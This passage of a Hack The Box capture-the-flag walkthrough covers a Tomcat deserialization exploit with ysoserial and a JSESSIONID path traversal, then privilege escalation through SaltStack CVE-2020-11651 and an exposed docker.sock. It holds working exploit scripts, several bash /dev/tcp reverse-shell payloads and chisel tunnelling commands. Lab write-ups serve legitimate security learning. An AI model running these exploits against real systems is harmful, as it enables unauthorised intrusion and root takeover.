class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>
<span class="token assign-left variable">l_ip</span><span class="token operator">=</span><span class="token string">"10.10.14.103"</span> <span class="token comment"># Local IP</span>
<span class="token assign-left variable">l_port</span><span class="token operator">=</span><span class="token string">"6969"</span> <span class="token comment"># Local port</span>
<span class="token assign-left variable">t_ip</span><span class="token operator">=</span><span class="token string">"10.10.10.205"</span> <span class="token comment"># Target IP</span>
<span class="token assign-left variable">t_port</span><span class="token operator">=</span><span class="token string">"8080"</span> <span class="token comment"># Target port</span>
<span class="token assign-left variable">u_path</span><span class="token operator">=</span><span class="token string">"/opt/samples/uploads"</span> <span class="token comment"># Upload path</span>

<span class="token assign-left variable">shell</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n <span class="token string">"bash -i >&amp; /dev/tcp/<span class="token variable">$l_ip</span>/<span class="token variable">$l_port</span> 0>&amp;1"</span> <span class="token operator">|</span> base64<span class="token variable">)</span></span>
<span class="token assign-left variable">payload</span><span class="token operator">=</span><span class="token string">"bash -c {echo,<span class="token variable">$shell</span>}|{base64,-d}|{bash,-i}"</span>
java -jar /home/samiko/Desktop/oscp-prep/HTB/Common/ysoserial.jar CommonsCollections2 <span class="token string">"<span class="token variable">${payload}</span>"</span> <span class="token operator">></span> reverse.session
<span class="token function">curl</span> -F <span class="token string">'image=@reverse.session'</span> http://<span class="token variable">$t_ip</span><span class="token builtin class-name">:</span><span class="token variable">$t_port</span>/upload.jsp?email<span class="token operator">=</span>samiko@htb.me
<span class="token function">curl</span> --cookie <span class="token string">"JSESSIONID=../../../../../<span class="token variable">$u_path</span>/reverse"</span> -L http://<span class="token variable">$t_ip</span><span class="token builtin class-name">:</span><span class="token variable">$t_port</span>/upload.jsp?email<span class="token operator">=</span>samiko@htb.me</span></span></span></code></pre></li><li id="https://www.notion.so/8585a3e805724693b28c416f30c75d0e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Listen for a reverse shell with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/dbbee5ead12a4696ac937d9f821e9464" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 6969</code></span></span></p></div></li><li id="https://www.notion.so/b705066802a840629a703cf854dabb18" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Run the exploit, and we should get a shell as tomcat:</span></span><div id="https://www.notion.so/8b1c7b7fbb0440b0bdeb8157223d6c2c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id</code></span></span></p></div><pre id="https://www.notion.so/c4371afc2b264280ad0159e3cef8bba5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>tomcat
uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)</span></span></span></code></pre></li><li id="https://www.notion.so/4c50b249b80b42fea6df86556fdfc15b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get user flag!</span></span></li></ul><h2 id="https://www.notion.so/1bc99b0c455d4e42876f361cad9817d3" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/1bc99b0c455d4e42876f361cad9817d3"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/9ad115ea26c24f30ae0dee45617ac20c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Checking for network interfaces:</span></span><div id="https://www.notion.so/bd5c742b54c340138cbb613bab2a46f1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ip a</code></span></span></p></div><pre id="https://www.notion.so/785b57bf61c0448fb1956ece0b2f0342" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
  link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
  inet 127.0.0.1/8 scope host lo
     valid_lft forever preferred_lft forever
  inet6 ::1/128 scope host
     valid_lft forever preferred_lft forever
2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
  link/ether 00:50:56:b9:79:7b brd ff:ff:ff:ff:ff:ff
  inet 10.10.10.205/24 brd 10.10.10.255 scope global ens160
     valid_lft forever preferred_lft forever
  inet6 dead:beef::250:56ff:feb9:797b/64 scope global dynamic mngtmpaddr
     valid_lft 86306sec preferred_lft 14306sec
  inet6 fe80::250:56ff:feb9:797b/64 scope link
     valid_lft forever preferred_lft forever
3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
  link/ether 02:42:d8:17:45:bb brd ff:ff:ff:ff:ff:ff
  inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
     valid_lft forever preferred_lft forever
  inet6 fe80::42:d8ff:fe17:45bb/64 scope link
     valid_lft forever preferred_lft forever
4: br-e9220f64857c: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default
  link/ether 02:42:4e:a6:3d:3a brd ff:ff:ff:ff:ff:ff
  inet 172.18.0.1/16 brd 172.18.255.255 scope global br-e9220f64857c
     valid_lft forever preferred_lft forever
6: veth3687d86@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default
  link/ether 9a:f9:53:6d:49:90 brd ff:ff:ff:ff:ff:ff link-netnsid 0
  inet6 fe80::98f9:53ff:fe6d:4990/64 scope link
     valid_lft forever preferred_lft forever</span></span></span></code></pre></li><li id="https://www.notion.so/ddb354e8029d48caac9f0d7d327b3dc1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We see </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">docker0</code></span><span class="SemanticString">, and two other unknown connections, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">br-e9220f64857c</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">veth3687d86@if5</code></span><span class="SemanticString">, presumably interfaces for Docker containers.</span></span></li><li id="https://www.notion.so/0cf96337b1d1459bbe9234ad01e4e135" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Checking for listening ports:</span></span><div id="https://www.notion.so/36f1d8bd3c4c4fceadd01a51bf8dc352" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ netstat -tulpn</code></span></span></p></div><pre id="https://www.notion.so/257a042850414fcc856934f75276cf51" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:36823         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:4505          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:4506          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      972/java
tcp6       0      0 :::8080                 :::*                    LISTEN      972/java
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -</span></span></span></code></pre></li><li id="https://www.notion.so/b7cc96b547e347d69cf3930b8c184722" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can safely ignore ports 22, 8005, and 8080. Port 22 is SSH, and 8005/8080 are running Tomcat which we have just exploited.</span></span></li><li id="https://www.notion.so/63e243523cb44830ada80f7b9fc1ef0b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Ports 4505, 4506 are also listening. After a quick search, we find out that the ports are used by SaltStack Salt, an infrastructure automation software. The request server port is by default set to 4506.</span></span></li><li id="https://www.notion.so/66ff6708158d4be9b7d52337d0a02beb" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">A quick search reveals two vulnerabilities within SaltStack that could lead to RCE, CVE-2020-11651 and CVE-2020-11652.</span></span></li><li id="https://www.notion.so/2438fd07ea9b4c79aa421c309638b702" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">CVE-2020-11651 allows remote user access, and CVE-2020-11652 permits arbitrary directory access.</span></span></li><li id="https://www.notion.so/f6722bcc04d14b8a92bec35368e4b208" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">SaltStack uses a master-slave model where the salt master is used to send commands and configurations to the salt minions (slaves). A single master can manage multiple minions.</span></span></li><li id="https://www.notion.so/e3e1c764b9504d0ca043ff97571ada15" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">In CVE-2020-11651, the salt master process, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ClearFuncs</code></span><span class="SemanticString">, does not validate method calls properly and exposes the following two methods:</span></span><ol class="NumberedListWrapper"><li id="https://www.notion.so/e9fd24a656254e7bb046e70ac3e1a4c4" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">_prep_auth_info()</strong></code></span><span class="SemanticString"> method, which returns the user token (Root Key). This allows the attackers retrieve user tokens to bypass authentication, resulting in remote command execution on both the salt master and minions.</span></span></li><li id="https://www.notion.so/899d372a78ce4324a39f2be13dcfe293" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">_send_pub()</code></span><span class="SemanticString"> method, which queues messages directly on the master publish server, and can be used to trigger minions to run arbitrary commands as root.</span></span></li></ol></li><li id="https://www.notion.so/857aa0f91888408fa92305ba1894c49a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">In CVE-2020-11652, the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">get_token()</code></span><span class="SemanticString"> method of the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">salt.tokens.localfs</code></span><span class="SemanticString"> fails to sanitize the token input parameter, which is then used as a filename, allowing insertion of traversal characters such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">../</code></span><span class="SemanticString"> and leading to arbitrary directory access.</span></span></li><li id="https://www.notion.so/ea1bfbd34e8d4098b270eea7e3f7bdc6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Using a PoC created by jasperla on </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/jasperla/CVE-2020-11651-poc">GitHub</a></span><span class="SemanticString">. Unfortunately, the exploit could not be run on remotely on the target, as the Salt module is missing and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pip</code></span><span class="SemanticString"> is not installed:</span></span><div id="https://www.notion.so/d831534d73484f9ebbef5a28357ee332" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ python3 rce.py</code></span></span></p></div><pre id="https://www.notion.so/d3d0162019444c20bd450701f06e9a64" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
    File <span class="token string">"rce.py"</span><span class="token punctuation">,</span> line <span class="token number">16</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
      <span class="token keyword">import</span> salt
  ModuleNotFoundError<span class="token punctuation">:</span> No module named <span class="token string">'salt'</span></span></span></span></code></pre></li><li id="https://www.notion.so/017cf1a79017446483178bf9a35ff5c2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This means we must exploit the target remotely from our local machine, which we can do by using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">chisel</code></span><span class="SemanticString"> to reverse port forward 4506.</span></span></li><li id="https://www.notion.so/fab8352d79b34a708b3bf4a223d19565" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Upload </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">chisel</code></span><span class="SemanticString"> to target:</span></span><div id="https://www.notion.so/14136b893a234d0e9d92d3d0669feb66" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cp /usr/local/bin/chisel ./www/</code></span></span></p></div><div id="https://www.notion.so/4b0d3084bfdb44e9948b66d22230fc42" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cd ./www &amp;&amp; updog</code></span></span></p></div><div id="https://www.notion.so/e7e6d69917674c9aa9def1fa53e5bfa5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ curl &lt;http://10.10.14.103:9090/chisel&gt; -o chisel</code></span></span></p></div></li><li id="https://www.notion.so/1a0e54b92d564302bc6ddaff9669472b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">On our local machine, setup a reverse tunnelling server:</span></span><div id="https://www.notion.so/51b65fdc6485455399d8a66f2cf58df7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ./chisel server -p 1337 --reverse</code></span></span></p></div></li><li id="https://www.notion.so/4d4f48eff9c04af18318f4cafe763d48" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">On the target machine, connect to our local server and forward port 4506 on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">localhost</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/e3f03f3b4457435d86b28f20541e0db1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ./chisel client 10.10.14.103:1337 R:4506:localhost:4506</code></span></span></p></div></li><li id="https://www.notion.so/c7c542c8acc542c18a7d77c0c8801563" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Exploit SaltStack with PoC, and spawn a reverse shell:</span></span><div id="https://www.notion.so/59116b8e25464cf4990bc8a4e8eb9f5a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ python saltstack_rce.py --exec &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.103/1234 0&gt;&amp;1&quot;&#x27;</code></span></span></p></div></li><li id="https://www.notion.so/4da29eb06dae4f848edccd2a4c0b9df5" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Now in the SaltStack container as root:</span></span><div id="https://www.notion.so/7e1702b58e6e4c8489d0c2e2930afdcd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id &amp;&amp; hostname</code></span></span></p></div><pre id="https://www.notion.so/5cdff473fb0d4fa08210032acdff13ee" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root
uid=0(root) gid=0(root) groups=0(root)
2d24bf61767c</span></span></span></code></pre></li><li id="https://www.notion.so/fb419f4bc3884c26b10509da30d9f6a2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">todo.txt</code></span><span class="SemanticString"> in root home directory:</span></span><pre id="https://www.notion.so/b069c3d1d7664bcf99e3256d4f2a0736" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>- Add saltstack support to auto-spawn sandbox dockers through events.
- Integrate changes to tomcat and make the service open to public.</span></span></span></code></pre></li><li id="https://www.notion.so/ee13409f161e473cb86a446f2112d86b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.bash_history</code></span><span class="SemanticString"> is not symlinked to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/dev/null</code></span><span class="SemanticString"> and is readable:</span></span><pre id="https://www.notion.so/f73745e1854f4247916465373e3ece70" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>cd /root
rm .wget-hsts
ls -la /var/run/
curl -s --unix-socket /var/run/docker.sock </span></span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://localhost/images/json"><span>http://localhost/images/json</span></a></span></span></code></pre></li><li id="https://www.notion.so/47fe9e2994b64488bd1cb43034b4a6b7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Back-tracing the administrator&#x27;s commands, we see that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">docker.sock</code></span><span class="SemanticString"> was accessed recently with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/e85e1a8847834d5798727a95eb343b04" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">If the administrator were to implement &quot;auto-spawning sandbox containers through events&quot; as mentioned in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">todo.txt</code></span><span class="SemanticString">, then </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">docker.sock</code></span><span class="SemanticString"> is most likely exposed in some way on the SaltStack container.</span></span></li><li id="https://www.notion.so/5052fe6dc0fb4414b7a58bdddae52a79" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Output upon running the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> command:</span></span><div id="https://www.notion.so/10ebd765fae64acaae6c31e0e491ac8f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ curl -s --unix-socket /var/run/docker.sock http://localhost/images/json</code></span></span></p></div><pre id="https://www.notion.so/b6ad9e05d8714068acb58c8bdae5fbbe" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[{&quot;Containers&quot;:-1,&quot;Created&quot;:1590787186,&quot;Id&quot;:&quot;sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e&quot;,
&quot;Labels&quot;:null,&quot;ParentId&quot;:&quot;&quot;,&quot;RepoDigests&quot;:null,&quot;RepoTags&quot;:[&quot;sandbox:latest&quot;],&quot;SharedSize&quot;:-1,&quot;Size&quot;:5574537,&quot;VirtualSize&quot;:5574537},
{&quot;Containers&quot;:-1,&quot;Created&quot;:1588544489,&quot;Id&quot;:&quot;sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9&quot;,
&quot;Labels&quot;:null,&quot;ParentId&quot;:&quot;&quot;,&quot;RepoDigests&quot;:[&quot;&lt;none&gt;@&lt;none&gt;&quot;],&quot;RepoTags&quot;:[&quot;&lt;none&gt;:&lt;none&gt;&quot;],&quot;SharedSize&quot;:-1,&quot;Size&quot;:1056679100,&quot;VirtualSize&quot;:1056679100}]</span></span></span></code></pre></li><li id="https://www.notion.so/573f5732272b4e7b827d9a98d4b826bf" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We confirm that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">docker.sock</code></span><span class="SemanticString"> is exposed and accessible using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> with flag </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">--unix-socket</code></span><span class="SemanticString">, this allows us to freely create, access, and modify docker containers on the host:</span></span><div id="https://www.notion.so/963620e8748b4484a5d22c529ef922ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ls -la /var/run/docker.sock</code></span></span></p></div><pre id="https://www.notion.so/90826fc2864a4efbb470ddc7e3780c5d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>srw-rw---- 1 root  118    0 Jan 27 05:20 docker.sock</span></span></span></code></pre></li><li id="https://www.notion.so/46351d5219e640c08b3b583025701e3c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Through </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">docker.sock</code></span><span class="SemanticString">, we can </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">mount</code></span><span class="SemanticString"> the host&#x27;s file system on the container and perform a node takeover.</span></span></li><li id="https://www.notion.so/9af2912fdbe64916a8f21ae8a3f912e8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Some example </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> commands for interacting with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">docker.sock</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/65017460f4c74395af48d6b0cce53950" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># Creating a container
curl -i -s -k  -X &#x27;POST&#x27; \
-H &#x27;Content-Type: application/json&#x27; \
--data-binary &#x27;{&quot;Hostname&quot;: &quot;&quot;,&quot;Domainname&quot;: &quot;&quot;,&quot;User&quot;: &quot;&quot;,&quot;AttachStdin&quot;: true,&quot;AttachStdout&quot;: true,&quot;AttachStderr&quot;: true,&quot;Tty&quot;: true,&quot;OpenStdin&quot;: true,&quot;StdinOnce&quot;: true,&quot;Entrypoint&quot;: &quot;/bin/bash&quot;,&quot;Image&quot;: &quot;ubuntu&quot;,&quot;Volumes&quot;: {&quot;/hostos/&quot;: {}},&quot;HostConfig&quot;: {&quot;Binds&quot;: [&quot;/:/hostos&quot;]}}&#x27; \
http://&lt;docker_host&gt;:PORT/containers/create

# Starting a container
curl -i -s -k  -X &#x27;POST&#x27; \
-H &#x27;Content-Type: application/json&#x27; \
http://&lt;docker_host&gt;:PORT/containers/&lt;container_ID&gt;/start</span></span></span></code></pre></li><li id="https://www.notion.so/80ae30c17db341a792a6044c633afc44" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Creating </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ds_exploit.sh</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/6aacbc57c61d4b0ca4745e07cbea4d2d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>
<span class="token comment"># Command to be executed on startup of the Docker container</span>
<span class="token assign-left variable">payload</span><span class="token operator">=</span><span class="token string">"[<span class="token entity" title="\&quot;">\"</span>/bin/sh<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>-c<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>chroot /tmp sh -c <span class="token entity" title="\\">\\</span><span class="token entity" title="\&quot;">\"</span>bash -c 'bash -i >&amp; /dev/tcp/10.10.14.103/9999 0>&amp;1'<span class="token entity" title="\\">\\</span><span class="token entity" title="\&quot;">\"</span><span class="token entity" title="\&quot;">\"</span>]"</span>

<span class="token comment"># Create detached container samikowashere, execute payload, and bind to the host's filesystem.</span>
<span class="token function">curl</span> -s -XPOST --unix-socket /var/run/docker.sock -d <span class="token string">"{<span class="token entity" title="\&quot;">\"</span>Image<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>sandbox<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>cmd<span class="token entity" title="\&quot;">\"</span>:<span class="token variable">$payload</span>,<span class="token entity" title="\&quot;">\"</span>Binds<span class="token entity" title="\&quot;">\"</span>:[<span class="token entity" title="\&quot;">\"</span>/:/tmp:rw<span class="token entity" title="\&quot;">\"</span>]}"</span> -H <span class="token string">'Content-Type: application/json'</span> http://localhost/containers/create?name<span class="token operator">=</span>samikowashere

<span class="token comment"># Start the container</span>
<span class="token function">curl</span> -s -XPOST --unix-socket /var/run/docker.sock <span class="token string">"http://localhost/containers/samikowashere/start"</span></span></span></span></code></pre></li><li id="https://www.notion.so/84e326433d6b4b43bb42e90c4528858d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get the exploit script on target machine, and make executable:</span></span><div id="https://www.notion.so/2be9e5574bde46abbacf75d8e0f9ccc8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ curl http://10.10.14.103:9090/ds_exploit.sh -o ds_exploit.sh</code></span></span></p></div><div id="https://www.notion.so/23620f32c21849418e66797ab8cc7b70" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ chmod +x ds_exploit.sh</code></span></span></p></div></li><li id="https://www.notion.so/836f59732d8046d5a33c2a63349a0cbf" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Listen for reverse shell locally, careful to not use ports that are already busy:</span></span><div id="https://www.notion.so/6da56f049f974a26a6a1e4b4cb3ed430" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 9999</code></span></span></p></div><div id="https://www.notion.so/9cfb23ecb02f44ddbe5c8d5242146219" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ./ds_exploit.sh</code></span></span></p></div><pre id="https://www.notion.so/555d0f1e7ea64d5590e534549222c960" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token punctuation">{</span><span class="token string">"Id"</span><span class="token punctuation">:</span><span class="token string">"aa30787a6c18ae6eccd785b50efdc59f4be896b8007c824586dc88af99a9fbae"</span><span class="token punctuation">,</span><span class="token string">"Warnings"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span></span></span></code></pre></li><li id="https://www.notion.so/64e4ae52a54b45e6872fb3ba9ba6be6e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We should get a shell as root on a new Docker container, bound to the host&#x27;s filesystem:</span></span><div id="https://www.notion.so/bccc872c5ebb433080dfbadd5af7cf61" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id &amp;&amp; hostname</code></span></span></p></div><pre id="https://www.notion.so/ebc5652d1b6c4c72a6dcd9400c4b7945" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
